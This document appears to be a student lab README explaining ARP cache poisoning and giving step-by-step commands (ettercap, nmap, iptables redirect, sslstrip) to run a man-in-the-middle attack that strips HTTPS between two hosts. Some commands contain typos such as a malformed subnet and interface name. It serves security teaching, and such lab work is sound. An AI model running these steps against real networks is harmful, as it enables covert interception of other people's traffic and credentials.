# ARP Cache Poisoning  

## What is the ARP Protocol  

Address Resolution Protocol (ARP) is a protocol that enables network communications to reach a specific device on the network. ARP translates Internet Protocol (IP) addresses to a Media Access Control (MAC) address, and vice versa.

## What is ARP Poisoning  

An ARP spoofing, also known as ARP poisoning, is a Man in the Middle (MitM) attack that allows attackers to intercept communication between network devices. The attack works as follows:

1. The attacker must have access to the network. They scan the network to determine the IP addresses of at least two devices⁠—let’s say these are a workstation and a router.  
2. The attacker uses a spoofing tool, such as Arpspoof or Driftnet, to send out forged ARP responses.  
3. The forged responses advertise that the correct MAC address for both IP addresses, belonging to the router and workstation, is the attacker’s MAC address. This fools both router and workstation to connect to the attacker’s machine, instead of to each other.  
4. The two devices update their ARP cache entries and from that point onwards, communicate with the attacker instead of directly with each other.  
5. The attacker is now secretly in the middle of all communications.  

## Steps to reproduce  
### [Setup(In Romanian)](https://github.com/iulianPeiu6/Labs.SI/blob/main/Homework2/Setup.pdf)  

### Run the Attack

1. Install ettercap-common
```console
sudo apt install ettercap-common
```  

3. Edit /etc/ettercap/etter.conf and uncoment the two lines after the line starting with "# if you use iptables:":
```console
sudo nano /etc/ettercap/etter.conf
```  

3.  Install nmap:
```console
sudo apt-get install nmap
```  

4. Run command:
```console
nmap -sP 192.1.11/24
```  

4. Edit /proc/sys/net/ipv4/ip_forward to change the content from "0" to "1"(if it is necesary):
```console
sudo nano /proc/sys/net/ipv4/ip_forward
```  

5. Run command:
```console
sudo iptables -t nat -A PREROUTING -i et0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```  

6.  Install sslstrip:
```console
sudo apt-get install sslstrip
``` 

7. Run command:
```console
sslstrip -a -f -l 8080
``` 

On another terminal:

8. Run command & activate remote_browser plugin:
```console
sudo ettercap -i eth0 -TqM ARP:REMOTE /192.168.1.11// /192.168.1.13
``` 

Now, the attacker is secretly in the middle of all communications  from C2 to Router

### Note:  

Some browsers or web applications have protection against this attack. To demonstrate the attack I have user [https://ubuntu.com/](https://ubuntu.com/).  
